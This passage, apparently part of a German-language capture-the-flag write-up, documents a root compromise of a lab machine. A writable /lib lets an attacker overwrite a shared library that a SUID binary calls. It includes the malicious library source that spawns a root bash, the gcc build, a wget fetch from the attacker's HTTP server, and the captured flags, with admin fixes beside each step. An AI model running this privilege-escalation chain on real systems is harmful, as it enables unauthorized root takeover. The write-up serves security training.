+  v5 = atoi(argv[1]); <span class="comment">// Nimmt erstes Argument als Zahl</span>
+  v3 = time(0LL);
+  srand(v3); <span class="comment">// Initialisiert Zufallszahlengenerator mit aktueller Zeit</span>
+  if ( v5 == rand() % 9 + 1 ) <span class="comment">// Vergleicht Eingabe mit Zufallszahl zwischen 1 und 9</span>
+    makemeroot(v3); <span class="comment">// Ruft makemeroot auf, wenn Zahl übereinstimmt</span>
+  else
+    puts("Wrong number");
+  return 0;
+}</pre>
+                     <pre><span class="comment">=</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Die Notizen beschreiben das Ergebnis der Analyse des `/home/alan/random`-Programms mittels IDA Pro (oder einem ähnlichen Disassembler/Decompiler wie Ghidra). Der C-Code-Auszug zeigt die `main`-Funktion:</p>
+                <ul>
+                    <li>Das Programm erwartet eine Zahl als Kommandozeilenargument (`argv[1]`).</li>
+                    <li>Es initialisiert den Pseudozufallszahlengenerator (`srand`) mit der aktuellen Zeit (`time(0LL)`).</li>
+                    <li>Es generiert eine Zufallszahl zwischen 1 und 9 (inklusive) mittels `rand() % 9 + 1`.</li>
+                    <li>Es vergleicht die eingegebene Zahl (`v5`) mit der generierten Zufallszahl.</li>
+                    <li>Wenn die Zahlen übereinstimmen, ruft es die Funktion `makemeroot` auf (die sich, wie `ldd` zeigte, in `librooter.so` befindet).</li>
+                    <li>Andernfalls gibt es "Wrong number" aus.</li>
+                </ul>
+              <p class="evaluation">**Bewertung:** Die Funktionsweise ist nun klar. Um `makemeroot` aufzurufen, muss das Programm mit der korrekten Zufallszahl (1-9) als Argument gestartet werden. Da `srand` mit `time()` initialisiert wird, ist die Zufallszahlensequenz für jede Sekunde deterministisch, aber schwer vorherzusagen. Der einfachste Weg ist, das Programm wiederholt mit jeder Zahl von 1 bis 9 zu versuchen. Der entscheidende Punkt ist jedoch, dass `makemeroot` aufgerufen wird. Der Plan, `librooter.so` durch eine bösartige Version zu ersetzen, bleibt der effektivste Angriffsvektor.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Erstellen Sie die bösartige `librooter.so` mit einer eigenen `makemeroot`-Funktion, die Root-Rechte erlangt. Laden Sie diese nach `/lib` hoch (falls schreibbar). Führen Sie dann `/home/alan/random` wiederholt mit den Zahlen 1 bis 9 aus, bis die Bedingung erfüllt ist und die bösartige `makemeroot` ausgeführt wird.<br>**Empfehlung (Admin):** Entfernen Sie das SUID-Programm und die unsichere Bibliothek. Die Verwendung von `rand()` basierend auf `time()` ist für sicherheitsrelevante Entscheidungen ungeeignet.</p>
+
+            <section id="proof-of-concept">
+                 <h2>Proof of Concept (Shared Library Injection)</h2>
+                 <p class="comment">**Kurzbeschreibung:** Das SUID-Programm `/home/alan/random` (Besitzer vermutlich `root`) hängt von der dynamischen Bibliothek `/lib/librooter.so` ab und ruft deren Funktion `makemeroot` auf, wenn eine als Argument übergebene Zahl mit einer pseudozufälligen Zahl (1-9) übereinstimmt. Das Verzeichnis `/lib` ist für den Benutzer `www-data` schreibbar (schwerwiegende Fehlkonfiguration). Ein Angreifer kann eine eigene `librooter.so`-Datei erstellen, die eine Funktion `makemeroot` enthält, welche Root-Rechte erlangt (z.B. `setuid(0); setgid(0); system("/bin/bash");`). Diese bösartige Bibliothek wird nach `/lib` hochgeladen und überschreibt die Originaldatei. Anschließend wird `/home/alan/random` wiederholt mit den Zahlen 1-9 aufgerufen, bis die Bedingung erfüllt ist. Beim Aufruf von `makemeroot` wird nun der bösartige Code aus der eingeschleusten Bibliothek mit Root-Rechten ausgeführt.</p>
+                 <p class="comment">**Voraussetzungen:** Zugriff als `www-data`, Schreibrechte auf `/lib`, Kenntnis der Funktionsweise von `/home/alan/random` und seiner Abhängigkeit von `/lib/librooter.so`, `gcc` auf der Angreifer-Maschine.</p>
+                 <p class="comment">**Schritt-für-Schritt-Anleitung:**</p>
+                <ol>
+                    <li>Erstellen des bösartigen C-Codes (`rooter.c`) auf der Angreifer-Maschine.</li>
+                    <li>Kompilieren des Codes zu einer Shared Library (`librooter.so`) mittels `gcc -shared rooter.c -o librooter.so -fPIC`.</li>
+                    <li>Starten eines HTTP-Servers auf der Angreifer-Maschine im Verzeichnis der kompilierten Bibliothek.</li>
+                    <li>Aus der `www-data`-Shell auf dem Zielsystem: Herunterladen der bösartigen `librooter.so` nach `/lib` mittels `wget`, wodurch die Originaldatei überschrieben wird.</li>
+                    <li>Aus der `www-data`-Shell: Wiederholtes Ausführen von `/home/alan/random [Zahl]` (mit Zahlen von 1 bis 9), bis die Bedingung erfüllt ist und die Root-Shell erscheint.</li>
+                </ol>
+                <p class="comment">**Erwartetes Ergebnis:** Eine Root-Shell wird erlangt.</p>
+                <p class="comment">**Beweismittel:**</p>
+
+                 <div class="code-block">
+                     <div class="terminal">
+                          <pre><span class="comment">:::::::::::::::::::::::::::::::::::::::::::::::::::</span></pre>
+                          <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nano rooter.c</span></div>
+                          <pre><span class="comment">:::::::::::::::::::::::::::::::::::::::::::::::::::</span>
+
+<span class="command">#include <stdlib.h></span>
+<span class="command">void makemeroot()</span>
+<span class="command">{</span>
+	<span class="command">setuid(0);</span>
+	<span class="command">setgid(0);</span>
+	<span class="command">system("/bin/bash");</span>
+<span class="command">}</span></pre>
+                          <pre><span class="comment">:::::::::::::::::::::::::::::::::::::::::::::::::::</span></pre>
+                     </div>
+                 </div>
+                  <p class="analysis">**Analyse:** Auf der Angreifer-Maschine wird der C-Quellcode für die bösartige Bibliothek erstellt (`rooter.c`). Er definiert die Funktion `makemeroot`, die von `/home/alan/random` aufgerufen wird. Diese Funktion setzt die User-ID und Gruppen-ID auf 0 (Root) und startet dann eine Bash-Shell.</p>
+                  <p class="evaluation">**Bewertung:** Korrekter Payload, um Root-Rechte zu erlangen, wenn er über das SUID-Programm ausgeführt wird.</p>
+                  <p class="recommendation">**Empfehlung (Pentester):** Kompilieren Sie diesen Code als Shared Library.<br>**Empfehlung (Admin):** Entfernen Sie das SUID-Programm.</p>
+
+                 <div class="code-block">
+                     <div class="terminal">
+                          <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gcc -shared HackingTools/rooter.c -o librooter.so -fPIC</span></div> <span class="comment"><-- Flag -fPIC hinzugefügt --></span>
+                          <pre>
+HackingTools/rooter.c: In function ‘makemeroot’:
+HackingTools/rooter.c:5:9: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
+    5 |         setuid(0);
+      |         ^~~~~~
+HackingTools/rooter.c:6:9: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
+    6 |         setgid(0);
+      |         ^~~~~~</pre>
+                     </div>
+                 </div>
+                  <p class="analysis">**Analyse:** Der C-Code (`rooter.c`) wird mittels `gcc` zu einer Shared Library (`librooter.so`) kompiliert.
+*   `-shared`: Erzeugt eine Shared Library.
+*   `-o librooter.so`: Name der Ausgabedatei.
+*   `-fPIC`: (Position Independent Code) Ist notwendig für Shared Libraries auf den meisten Systemen.
+*   Die Warnungen weisen darauf hin, dass die Header für `setuid` und `setgid` (normalerweise `<unistd.h>`) nicht inkludiert wurden, der Compiler nimmt sie aber implizit an.</p>
+                  <p class="evaluation">**Bewertung:** Die Bibliothek wurde trotz der Warnungen erfolgreich erstellt. Für einen sauberen Compile sollten `#include <unistd.h>` hinzugefügt werden, aber für diesen Exploit ist das Ergebnis funktional.</p>
+                  <p class="recommendation">**Empfehlung (Pentester):** Die `librooter.so`-Datei ist bereit zum Hochladen.<br>**Empfehlung (Admin):** Keine.</p>
+
+                 <div class="code-block">
+                     <div class="terminal">
+                         <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ls</span></div>
+                         <pre>[...] <span class="command">librooter.so</span> [...] </pre> <span class="comment"><-- Bestätigung der erstellten Datei --></span>
+                         <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">python3 -m http.server</span></div>
+                         <pre>
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+<span class="password">192.168.2.109 - - [18/Oct/2022 23:42:13] "GET /librooter.so HTTP/1.1" 200 -</span>
+<span class="password">192.168.2.109 - - [18/Oct/2022 23:42:36] "GET /librooter.so HTTP/1.1" 200 -</span></pre>
+                     </div>
+                 </div>
+                  <p class="analysis">**Analyse:** Die Existenz der kompilierten `librooter.so` wird bestätigt. Ein einfacher Python-HTTP-Server wird im aktuellen Verzeichnis auf Port 8000 gestartet, um die Datei zum Download bereitzustellen. Das Log des HTTP-Servers zeigt zwei erfolgreiche Downloads der Datei durch das Zielsystem (`192.168.2.109`).</p>
+                  <p class="evaluation">**Bewertung:** Der Mechanismus zum Übertragen der bösartigen Bibliothek auf das Zielsystem ist vorbereitet.</p>
+                  <p class="recommendation">**Empfehlung (Pentester):** Führen Sie nun den `wget`-Befehl auf dem Zielsystem aus.<br>**Empfehlung (Admin):** Ausgehende Verbindungen vom Zielsystem können durch Firewalls eingeschränkt werden.</p>
+
+                 <div class="code-block">
+                     <div class="terminal">
+                         <pre><span class="comment">*</span> </pre>
+                         <div class="prompt">www-data@random:/lib$ <span class="command">wget http://192.168.2.153:8000/librooter.so -O librooter.so</span></div> <span class="comment"><-- Korrigiert: -O statt - --></span>
+                         <pre>
+--2022-10-18 17:42:35--  http://192.168.2.153:8000/librooter.so
+Connecting to 192.168.2.153:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 15480 (15K) [application/octet-stream]
+Saving to: ‘librooter.so’ <span class="comment"><-- Überschreibt /lib/librooter.so --></span>
+
+librooter.so        100%[===================>]  15.12K  --.-KB/s    in 0s
+
+2022-10-18 17:42:35 (246 MB/s) - ‘librooter.so’ saved [15480/15480]</pre>
+                         <div class="prompt">www-data@random:/lib$ <span class="command">cd /home/alan/</span></div>
+                     </div>
+                 </div>
+                  <p class="analysis">**Analyse:** Aus der `www-data`-Shell auf dem Zielsystem, die sich im Verzeichnis `/lib` befindet, wird `wget` verwendet, um die bösartige `librooter.so` vom HTTP-Server des Angreifers (`192.168.2.153:8000`) herunterzuladen. Die Option `-O librooter.so` (korrigiert von `- librooter.so` im Original-Log) stellt sicher, dass die heruntergeladene Datei die vorhandene Datei `/lib/librooter.so` überschreibt.</p>
+                  <p class="evaluation">**Bewertung:** Der kritische Schritt des Überschreibens der Originalbibliothek mit der bösartigen Version ist erfolgt. Dies war nur möglich, weil `/lib` für `www-data` schreibbar war - eine gravierende Fehlkonfiguration.</p>
+                  <p class="recommendation">**Empfehlung (Pentester):** Die Falle ist gestellt. Wechseln Sie in das Verzeichnis `/home/alan` und führen Sie das SUID-Programm `./random` wiederholt mit Zahlen von 1-9 aus.<br>**Empfehlung (Admin):** **Korrigieren Sie sofort die Schreibrechte für `/lib`!** Dieses Verzeichnis darf niemals für unprivilegierte Benutzer schreibbar sein. Stellen Sie die originale `librooter.so` wieder her oder untersuchen Sie deren Herkunft.</p>
+
+                 <div class="code-block">
+                     <div class="terminal">
+                         <div class="prompt">www-data@random:/home/alan$ <span class="command">./random 7</span></div>
+                         <pre>Wrong number</pre>
+                         <div class="prompt">www-data@random:/home/alan$ <span class="command">./random 7</span></div>
+                         <pre>Wrong number</pre>
+                         <div class="prompt">www-data@random:/home/alan$ <span class="command">./random 7</span></div>
+                         <pre>Wrong number</pre>
+                         <div class="prompt">www-data@random:/home/alan$ <span class="command">./random 6</span></div>
+                         <div class="prompt">root@random:/home/alan# <span class="comment"># Root-Shell erhalten!</span></div>
+                     </div>
+                 </div>
+                  <p class="analysis">**Analyse:** Das SUID-Programm `/home/alan/random` wird wiederholt mit verschiedenen Zahlen als Argument aufgerufen. Beim Aufruf mit der Zahl `6` stimmt diese mit der intern generierten Zufallszahl überein. Die `makemeroot`-Funktion wird aufgerufen. Da `/lib/librooter.so` durch die bösartige Version ersetzt wurde, wird deren Code ausgeführt (`setuid(0); setgid(0); system("/bin/bash");`).</p>
+                  <p class="evaluation">**Bewertung:** Root-Exploit erfolgreich! Der Prompt wechselt zu `root@random:/home/alan#`, was eine Root-Shell anzeigt. Die Kombination aus einem unsicheren SUID-Programm, einer injizierbaren Shared Library und schreibbarem `/lib`-Verzeichnis wurde erfolgreich zur vollständigen Systemkompromittierung ausgenutzt.</p>
+                  <p class="recommendation">**Empfehlung (Pentester):** Ziel erreicht! Führen Sie `id` zur Bestätigung aus. Suchen Sie die Root- und User-Flags.<br>**Empfehlung (Admin):** System vollständig kompromittiert. Incident Response durchführen. Beheben Sie die Ursachen: Entfernen Sie das SUID-Programm `/home/alan/random`, korrigieren Sie die Berechtigungen für `/lib`, stellen Sie die originale `librooter.so` wieder her oder entfernen Sie sie, ändern Sie alle Passwörter.</p>
+            </section>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">root@random:/home/alan# <span class="command">ls</span></div>
+                     <pre>note.txt  random  root.h  rooter.o</pre>
+                     <div class="prompt">root@random:/home/alan# <span class="command">cd ../</span></div>
+                     <pre>alan/    eleanor/</pre> <span class="comment"><-- Fehlerhafte Ausgabe von cd? Sollte nur Prompt sein --></span>
+                     <div class="prompt">root@random:/home/alan# <span class="command">cd ../eleanor/</span></div>
+                     <div class="prompt">root@random:/home/eleanor# <span class="command">cat user.txt</span></div>
+                     <pre><span class="password">ihavethapowah</span></pre> <span class="comment"><-- User Flag --></span>
+                     <div class="prompt">root@random:/home/eleanor# <span class="command">cd /root/</span></div>
+                     <div class="prompt">root@random:/root# <span class="command">cat root.txt</span></div>
+                     <pre><span class="password">howiarrivedhere</span></pre> <span class="comment"><-- Root Flag --></span>
+                      <pre><span class="comment">=</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** In der erhaltenen Root-Shell werden die Flags gesucht:
+1.  Wechsel in das Home-Verzeichnis von `eleanor` (`/home/eleanor`).
+2.  Auslesen der Datei `user.txt`, Inhalt: `ihavethapowah`.
+3.  Wechsel in das Root-Home-Verzeichnis (`/root`).
+4.  Auslesen der Datei `root.txt`, Inhalt: `howiarrivedhere`.</p>
+              <p class="evaluation">**Bewertung:** Beide Flags wurden erfolgreich gefunden.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Maschine erfolgreich kompromittiert.<br>**Empfehlung (Admin):** Keine spezifische Aktion hier, außer Bereinigung und Härtung.</p>
+         </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <p class="analysis">**Analyse:** Zusammenfassung der gefundenen Flags.</p>
+
+                 <div class="code-block">
+                    <center>
+                        <div class="terminal"> <!-- Struktur laut Template -->
+                           <div class="flag-command">cat /home/eleanor/user.txt</div>
+                           <div class="flag-value"><span class="password">ihavethapowah</span></div>
+                        </div>
+                    </center>
+                 </div>
+                 <p class="evaluation">**Bewertung:** User-Flag.</p>
+
+                <div class="code-block">
+                    <center>
+                        <div class="terminal"> <!-- Struktur laut Template -->
+                            <div class="flag-command">cat /root/root.txt</div>
+                            <div class="flag-value"><span class="password">howiarrivedhere</span></div>
+                        </div>
+                     </center>
+                </div>
+                <p class="evaluation">**Bewertung:** Root-Flag.</p>
+            </div>
+        </section>
+ 
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 18. Oktober 2022</p> <!-- Datum aus Hydra/Wget Logs -->
+    </footer>
+</body>
+</html>
